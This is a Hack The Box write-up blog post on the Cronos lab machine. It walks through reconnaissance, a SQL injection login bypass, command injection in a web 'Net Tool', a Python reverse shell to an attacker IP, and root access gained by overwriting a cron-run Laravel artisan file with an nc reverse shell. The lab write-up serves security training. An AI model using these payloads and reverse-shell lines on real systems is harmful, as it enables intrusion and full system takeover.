<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>nullarmor | Cronos - Hack The Box</title>
  <meta name="description" content="Resolution of the Cronos machine">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:title" content="Cronos - Hack The Box">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://nullarmor.github.io/posts/cronos">
  <meta property="og:description" content="Resolution of the Cronos machine">
  <meta property="og:site_name" content="nullarmor">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:url" content="https://nullarmor.github.io/posts/cronos">
  <meta name="twitter:title" content="Cronos - Hack The Box">
  <meta name="twitter:description" content="Resolution of the Cronos machine">
  <meta name="google-site-verification" content="1sfOj2zDu7c444806MBQqbqFzNWxik880zgryQLMj-o" />

  
    
      <meta property="og:image" content="https://nullarmor.github.io/assets/hackthebox/cronos/cronos-00-633ba799c98e144a6a01b6fa43b0379b62db0bfb2bc2ae726911c23b2b8193f5.png">
      <meta name="twitter:image" content="https://nullarmor.github.io/assets/hackthebox/cronos/cronos-00-633ba799c98e144a6a01b6fa43b0379b62db0bfb2bc2ae726911c23b2b8193f5.png">
    
  

  <link href="https://nullarmor.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="nullarmor Last 10 blog posts" />

  

  

    
      <link rel="icon" type="image/x-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="apple-touch-icon" href="/assets/favicon-5df081ea197cddd592e345971da85e359e2f613dae2506c368835a695a297f82.gif">
      <link rel="stylesheet" type="text/css" title="light" id="light" href="/assets/light-fd3e34295723b96a04f635903b3650e5bb101ebdcc4d959165c3b4d2d88abe5e.css">
      <link rel="stylesheet" type="text/css" title="dark" id="dark" href="/assets/dark-0f2545b8bdef934d32dd563b17074c614e7f4f4d5c3e682d4089a07fed36aa84.css" disabled="false">
    

  

</head>

<body>
  <main>
    <div class="grid grid-centered">
      <div class="grid-cell">
        <nav class="header-nav scrollappear">
  <a href="/" class="header-logo" title="nullarmor">nullarmor</a>
  <ul class="header-links">
    
      <li>
        <a href="/about" title="About me">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
</svg>

        </a>
      </li>
    
    
      <li>
        <a href="https://twitter.com/nullarmor" rel="noreferrer noopener" target="_blank" title="Twitter">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
</svg>

        </a>
      </li>
    
    
    
    
      <li>
        <a href="https://github.com/nullarmor" rel="noreferrer noopener" target="_blank" title="GitHub">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
      <li>
        <a href="https://www.linkedin.com/in/renan-almeida-8137a81a6" rel="noreferrer noopener" target="_blank" title="LinkedIn">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
  <use href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin" xlink:href="/assets/linkedin-cdc5c107044324a3dfbea2e9ead15873f8dee304c37d73a046988956b706256e.svg#icon-linkedin"></use>
</svg>

        </a>
      </li>
    
    
    
    
    
    
    
    
    
    
    
    
    
      <li>
        <a href="mailto:nullarmor@protonmail.com" title="Email">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
</svg>

        </a>
      </li>
    
    
    
      <li>
        <a onclick="toggle()" title="Toggle Theme">
          <svg xmlns="http://www.w3.org/2000/svg" class="icon-theme">
  <use href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme" xlink:href="/assets/theme-66869e0bf8dab34bae1c86bda400327b772e0be69e8dc28d3ede896e771320ed.svg#icon-theme"></use>
</svg>

        </a>
      </li>
    
  </ul>
</nav>


  <ul class="header-tags scrollappear">
    
    
      
        <li><a href="/tag/ctf">Ctf</a></li>
    
      
        <li><a href="/tag/cybrics">Cybrics</a></li>
    
      
        <li><a href="/tag/hackthebox">Hackthebox</a></li>
    
      
        <li><a href="/tag/hacktivitycon">Hacktivitycon</a></li>
    
      
        <li><a href="/tag/pwn">Pwn</a></li>
    
      
        <li><a href="/tag/rev">Rev</a></li>
    
      
        <li><a href="/tag/rgbctf">Rgbctf</a></li>
    
      
        <li><a href="/tag/web">Web</a></li>
    
  </ul>


        <article class="article scrollappear">
          <header class="article-header">
            <h1>Cronos - Hack The Box</h1>
            <p>Resolution of the Cronos machine</p>
            <div class="article-list-footer">
  <span class="article-list-date">
    July 6, 2020
  </span>
  <span class="article-list-divider">-</span>
  <span class="article-list-minutes">
    
    
      6 minute read
    
  </span>
  <span class="article-list-divider">-</span>
  <div class="article-list-tags">
    
      
      <a href="/tag/hackthebox" title="See all posts with tag 'HackTheBox'">HackTheBox</a>
    
  </div>
</div>
          </header>

          <div class="article-content">
            <p><a href="/assets/hackthebox/cronos/cronos-00-633ba799c98e144a6a01b6fa43b0379b62db0bfb2bc2ae726911c23b2b8193f5.png">
  <img src="/assets/hackthebox/cronos/cronos-00-633ba799c98e144a6a01b6fa43b0379b62db0bfb2bc2ae726911c23b2b8193f5.png" alt="Cronos banner" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-00-633ba799c98e144a6a01b6fa43b0379b62db0bfb2bc2ae726911c23b2b8193f5.png" data-zooming-width="595" data-zooming-height="380">
</a></p>

<p>Cronos is a medium level machine based on Linux, the initial approach is based on two ways to <code class="highlighter-rouge">bypass the authentication</code> of the web application named Cronos, the first one involve <code class="highlighter-rouge">SQLi</code> on login’s form and the second one involve the <code class="highlighter-rouge">session</code>.
The privilege escalation process is based on cronjobs and PHP file manipulation.</p>

<h1 id="recon">Recon</h1>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="c"># Nmap 7.80 scan initiated Sat May 16 15:33:24 2020 as: nmap -sC -sV -oA chronos -T4 10.10.10.13</span>
Nmap scan report <span class="k">for </span>10.10.10.13
Host is up <span class="o">(</span>0.15s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 997 filtered ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 <span class="o">(</span>RSA<span class="o">)</span>
|   256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1a:0e:e7:ba:00:cc:02:01:04:cd:a3:a9:3f:5e:22:20 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp open  domain  ISC BIND 9.10.3-P4 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
<span class="c"># Nmap done at Sat May 16 15:33:50 2020 -- 1 IP address (1 host up) scanned in 26.22 seconds</span></code></pre></figure>

<p>The port 80 has the default Apache2 page:</p>

<p><a href="/assets/hackthebox/cronos/cronos-01-9a70e5ba8801ef07dbc5b0fc18db07dc7fb8b2a69bf2af1c2858f22001562f90.png">
  <img src="/assets/hackthebox/cronos/cronos-01-9a70e5ba8801ef07dbc5b0fc18db07dc7fb8b2a69bf2af1c2858f22001562f90.png" alt="Cronos Recon" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-01-9a70e5ba8801ef07dbc5b0fc18db07dc7fb8b2a69bf2af1c2858f22001562f90.png" data-zooming-width="1206" data-zooming-height="528">
</a></p>

<p>The port 53 is opened, what means that probably there’s a DNS translation to the machines’s IP:</p>

<p><a href="/assets/hackthebox/cronos/cronos-02-6a88b091ecf5f68423f1bc156e4443507b3985823c782a15ca652f2df4692b2d.png">
  <img src="/assets/hackthebox/cronos/cronos-02-6a88b091ecf5f68423f1bc156e4443507b3985823c782a15ca652f2df4692b2d.png" alt="Cronos Recon" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-02-6a88b091ecf5f68423f1bc156e4443507b3985823c782a15ca652f2df4692b2d.png" data-zooming-width="770" data-zooming-height="229">
</a></p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"10.10.10.13 cronos.htb"</span>
<span class="nb">echo</span> <span class="s2">"10.10.10.13 admin.cronos.htb"</span></code></pre></figure>

<p>Done, now we can access the web application named <code class="highlighter-rouge">Cronos</code>, both index page and the administrator’s login page:</p>

<p><a href="/assets/hackthebox/cronos/cronos-03-5d9a2bcbdf252b3f7b62fa95971ecb4f3b4a40c051e49874e641b6ab9d080e49.png">
  <img src="/assets/hackthebox/cronos/cronos-03-5d9a2bcbdf252b3f7b62fa95971ecb4f3b4a40c051e49874e641b6ab9d080e49.png" alt="Cronos Recon" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-03-5d9a2bcbdf252b3f7b62fa95971ecb4f3b4a40c051e49874e641b6ab9d080e49.png" data-zooming-width="1215" data-zooming-height="457">
</a></p>

<p><a href="/assets/hackthebox/cronos/cronos-04-864209c661dc25c1e8b92bf2f01f66aa08516b323e961460b6dcf157f05a7e5a.png">
  <img src="/assets/hackthebox/cronos/cronos-04-864209c661dc25c1e8b92bf2f01f66aa08516b323e961460b6dcf157f05a7e5a.png" alt="Cronos Recon" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-04-864209c661dc25c1e8b92bf2f01f66aa08516b323e961460b6dcf157f05a7e5a.png" data-zooming-width="1207" data-zooming-height="428">
</a></p>

<p>After the web enumeration using gobuster, we got the following results:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://cronos.htb <span class="nt">-x</span> .php,.txt <span class="nt">-t</span> 50
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://cronos.htb
<span class="o">[</span>+] Threads:        50
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/07/06 15:14:10 Starting gobuster
<span class="o">===============================================================</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
/css <span class="o">(</span>Status: 301<span class="o">)</span>
/favicon.ico <span class="o">(</span>Status: 200<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/js <span class="o">(</span>Status: 301<span class="o">)</span>
/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
<span class="o">===============================================================</span>
2020/07/06 15:17:39 Finished
<span class="o">===============================================================</span></code></pre></figure>

<p>The results for the <code class="highlighter-rouge">admin.cronos.htb</code>:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">gobuster <span class="nb">dir</span> <span class="nt">-w</span> /usr/share/wordlists/dirb/big.txt <span class="nt">-u</span> http://admin.cronos.htb <span class="nt">-x</span> .php,.txt <span class="nt">-t</span> 50
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://admin.cronos.htb
<span class="o">[</span>+] Threads:        50
<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirb/big.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Extensions:     php,txt
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/07/06 15:34:27 Starting gobuster
<span class="o">===============================================================</span>
/.htaccess <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/.htaccess.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.php <span class="o">(</span>Status: 403<span class="o">)</span>
/.htpasswd.txt <span class="o">(</span>Status: 403<span class="o">)</span>
/config.php <span class="o">(</span>Status: 200<span class="o">)</span>
/index.php <span class="o">(</span>Status: 200<span class="o">)</span>
/logout.php <span class="o">(</span>Status: 302<span class="o">)</span>
/server-status <span class="o">(</span>Status: 403<span class="o">)</span>
/session.php <span class="o">(</span>Status: 302<span class="o">)</span>
/welcome.php <span class="o">(</span>Status: 302<span class="o">)</span>
<span class="o">===============================================================</span>
2020/07/06 15:38:51 Finished
<span class="o">===============================================================</span></code></pre></figure>

<h1 id="exploiting---bypassing-the-authentication-with-sqli--injecting-system-commands">Exploiting - Bypassing the authentication with SQLi &amp; Injecting system commands</h1>

<p>Injecting a simple SQLi payload on login’s form of the administration results in an authentication bypass:</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="s1">' OR 1=1 -- '</span> </code></pre></figure>

<p><a href="/assets/hackthebox/cronos/cronos-05-ed4e3f856f469f27eae8a4009e731a9b06fd39f5d7d258f880b9780788f38360.png">
  <img src="/assets/hackthebox/cronos/cronos-05-ed4e3f856f469f27eae8a4009e731a9b06fd39f5d7d258f880b9780788f38360.png" alt="Cronos Exploiting" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-05-ed4e3f856f469f27eae8a4009e731a9b06fd39f5d7d258f880b9780788f38360.png" data-zooming-width="1209" data-zooming-height="239">
</a></p>

<p>It’s possible to inject system commands through <code class="highlighter-rouge">Net Tool v0.1</code>, with the <code class="highlighter-rouge">sleep</code> command I confirmed that the application is vulnerable to <code class="highlighter-rouge">command injection</code>.</p>

<p>The main reason is because the server delayed 10 seconds to return the response to me, that’s because I sent <code class="highlighter-rouge">8.8.8.8;sleep 10</code>.</p>

<p>Knowing this, we can send a reverse shell stager and set up a listening socket with netcat:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">python <span class="nt">-c</span> <span class="s1">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.26",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span></code></pre></figure>

<p>After sending the stager we got a reverse shell connection as <code class="highlighter-rouge">www-data</code> and the first flag!</p>

<p><a href="/assets/hackthebox/cronos/cronos-06-a730e87295fdce41e2a1ac7da71d66560d7c7baafcedb4b5de332e062ea2ac98.png">
  <img src="/assets/hackthebox/cronos/cronos-06-a730e87295fdce41e2a1ac7da71d66560d7c7baafcedb4b5de332e062ea2ac98.png" alt="Cronos Exploiting" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-06-a730e87295fdce41e2a1ac7da71d66560d7c7baafcedb4b5de332e062ea2ac98.png" data-zooming-width="425" data-zooming-height="115">
</a></p>

<h1 id="exploiting---bypassing-with-a-session-logic-bug">Exploiting - Bypassing with a session logic bug</h1>

<p>In this method there’s a bug in the session that allow an attacker to read every page’s content before the redirection of the unauthorized session.
We actually can read any file protected by the session, for example:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">curl admin.cronos.htb/welcome.php</code></pre></figure>

<p>The result:</p>

<figure class="highlight"><pre><code class="language-html" data-lang="html"><span class="nt">&lt;html</span><span class="err">"</span><span class="nt">&gt;</span>
   
   <span class="nt">&lt;head&gt;</span>
      <span class="nt">&lt;title&gt;</span>Net Tool v0.1 <span class="nt">&lt;/title&gt;</span>
   <span class="nt">&lt;/head&gt;</span>
   
   <span class="nt">&lt;body&gt;</span>
	<span class="nt">&lt;h1&gt;</span>Net Tool v0.1<span class="nt">&lt;/h1&gt;</span>
	<span class="nt">&lt;form</span> <span class="na">method=</span><span class="s">"POST"</span> <span class="na">action=</span><span class="s">""</span><span class="nt">&gt;</span>
	<span class="nt">&lt;select</span> <span class="na">name=</span><span class="s">"command"</span><span class="nt">&gt;</span>
		<span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"traceroute"</span><span class="nt">&gt;</span>traceroute<span class="nt">&lt;/option&gt;</span>
		<span class="nt">&lt;option</span> <span class="na">value=</span><span class="s">"ping -c 1"</span><span class="nt">&gt;</span>ping<span class="nt">&lt;/option&gt;</span>
	<span class="nt">&lt;/select&gt;</span>
	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"host"</span> <span class="na">value=</span><span class="s">"8.8.8.8"</span><span class="nt">/&gt;</span>
	<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">value=</span><span class="s">"Execute!"</span><span class="nt">/&gt;</span>
	<span class="nt">&lt;/form&gt;</span>
	      <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href = </span><span class="s">"logout.php"</span><span class="nt">&gt;</span>Sign Out<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
   <span class="nt">&lt;/body&gt;</span>
   
<span class="nt">&lt;/html&gt;</span></code></pre></figure>

<p>We can explore this by downloading the source code directly to our machine and filling the form’s action parameter!</p>

<h1 id="exploiting---using-a-custom-exploit">Exploiting - Using a custom exploit</h1>

<p>For knowledge purposes I made a custom exploit that inject system commands through <code class="highlighter-rouge">Net Tool v0.1</code> application as unauthenticated user, send the reverse shell stager and spawn an interactive shell to us, it’s available on my GitHub :)</p>

<p><a href="https://github.com/nullarmor/hackthebox-exploits/tree/master/cronos" target="_blank">Cronos Exploit</a></p>

<p><a href="/assets/hackthebox/cronos/cronos-07-98fe34ab2da956cd7b87c50d482760c99463fd91455ad26df23625d2f26ce47b.png">
  <img src="/assets/hackthebox/cronos/cronos-07-98fe34ab2da956cd7b87c50d482760c99463fd91455ad26df23625d2f26ce47b.png" alt="Cronos Exploiting" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-07-98fe34ab2da956cd7b87c50d482760c99463fd91455ad26df23625d2f26ce47b.png" data-zooming-width="738" data-zooming-height="203">
</a></p>

<h1 id="post-exploitation---getting-credentials-and-exploring-cronjobs">Post Exploitation - Getting credentials and exploring cronjobs</h1>

<p>Doing a quick enumeration, we found that the <code class="highlighter-rouge">config.php</code> file has the MySQL credentials:</p>

<figure class="highlight"><pre><code class="language-php" data-lang="php"><span class="cp">&lt;?php</span>
   <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_SERVER'</span><span class="p">,</span> <span class="s1">'localhost'</span><span class="p">);</span>
   <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_USERNAME'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">);</span>
   <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'kEjdbRigfBHUREiNSDs'</span><span class="p">);</span>
   <span class="nb">define</span><span class="p">(</span><span class="s1">'DB_DATABASE'</span><span class="p">,</span> <span class="s1">'admin'</span><span class="p">);</span>
   <span class="nv">$db</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nx">DB_SERVER</span><span class="p">,</span><span class="nx">DB_USERNAME</span><span class="p">,</span><span class="nx">DB_PASSWORD</span><span class="p">,</span><span class="nx">DB_DATABASE</span><span class="p">);</span>
<span class="cp">?&gt;</span></code></pre></figure>

<p>Using the mysql, we successfully got the hashed password for the Cronos application:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell">mysql <span class="nt">-pkEjdbRigfBHUREiNSDs</span> <span class="nt">-e</span> <span class="s2">"SELECT * FROM users"</span> <span class="nt">-u</span>&lt; <span class="nt">-pkEjdbRigfBHUREiNSDs</span> <span class="nt">-e</span> <span class="s2">"SELECT * FROM users"</span> <span class="nt">-u</span> admin admin</code></pre></figure>

<p><a href="/assets/hackthebox/cronos/cronos-08-ab0842cde91342b43fc8d32a8219f4dcf0e026e79a5b2719d3898f5da050d6a2.png">
  <img src="/assets/hackthebox/cronos/cronos-08-ab0842cde91342b43fc8d32a8219f4dcf0e026e79a5b2719d3898f5da050d6a2.png" alt="Cronos Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-08-ab0842cde91342b43fc8d32a8219f4dcf0e026e79a5b2719d3898f5da050d6a2.png" data-zooming-width="847" data-zooming-height="79">
</a></p>

<p><a href="/assets/hackthebox/cronos/cronos-09-97ecc51a590318b376ffe651bda005e555c3169dc11338ec687c7d026f6fc6cd.png">
  <img src="/assets/hackthebox/cronos/cronos-09-97ecc51a590318b376ffe651bda005e555c3169dc11338ec687c7d026f6fc6cd.png" alt="Cronos Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-09-97ecc51a590318b376ffe651bda005e555c3169dc11338ec687c7d026f6fc6cd.png" data-zooming-width="512" data-zooming-height="256">
</a></p>

<blockquote>
  <p>These credentials are not important</p>
</blockquote>

<p>Continuing with the recon, we found a <code class="highlighter-rouge">cronjob that is executed by root every 30 seconds</code>:</p>

<blockquote>
  <p>php /var/www/laravel/artisan schedule:run » /dev/null 2&gt;&amp;1</p>
</blockquote>

<p>This file is a Laravel module and we have permission to edit it, so now we need to create a backup for it:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">cp </span>artisan artisan.bkp</code></pre></figure>

<p>Now we need to overwrite the file with the reverse shell stager and wait 30 seconds to get a root reverse shell connection:</p>

<figure class="highlight"><pre><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">"&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.26 4444 &gt;/tmp/f');?&gt;"</span> <span class="o">&gt;</span> artisan</code></pre></figure>

<p>After 30 seconds we got a root shell!</p>

<p><a href="/assets/hackthebox/cronos/cronos-10-9063ba6cf0b7a5812d2d983ec3bfa9e771280d5645210fd7da5a5a3f7c5ccbdb.png">
  <img src="/assets/hackthebox/cronos/cronos-10-9063ba6cf0b7a5812d2d983ec3bfa9e771280d5645210fd7da5a5a3f7c5ccbdb.png" alt="Cronos Post Exploitation" class="zooming" data-rjs="/assets/hackthebox/cronos/cronos-10-9063ba6cf0b7a5812d2d983ec3bfa9e771280d5645210fd7da5a5a3f7c5ccbdb.png" data-zooming-width="1240" data-zooming-height="230">
</a></p>

          </div>
          <div class="article-share">
            
            
            <a href="https://twitter.com/home?status=Cronos+-+Hack+The+Box%20-%20https://nullarmor.github.io/posts/cronos%20by%20@nullarmor" title="Share on Twitter" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"></path></svg>
            </a>
            <a href="https://www.facebook.com/sharer/sharer.php?u=https://nullarmor.github.io/posts/cronos" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
              <svg viewbox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"></path></svg>
            </a>
          </div>

          
            <div id="disqus_thread" class="article-comments"></div>
            <script src="https://nullarmor.disqus.com/embed.js" async defer></script>
            <noscript>Please enable JavaScript to view the comments.</noscript>
          
        </article>
        <footer class="footer scrollappear">
  <p>
    This site uses Chalk theme made by Nielsen Ramon.
  </p>
</footer>

      </div>
    </div>
  </main>
  
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-159304176-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-159304176-1');
  </script>


<script type="text/javascript" src="/assets/vendor-2c224c53eb697c739f9490c38819a72184f09472739fd9e492272ef174090428.js"></script>


  <script type="text/javascript" src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js"></script>



  <script type="text/javascript" src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js"></script>


<script type="text/javascript" src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js"></script>


  <script type="text/javascript" src="/assets/themetoggle-df0d3d73164dc26dffbd630182ae4d0dfa7bee6b694a2b5d565d73595b582bbf.js"></script>

</body>
</html>
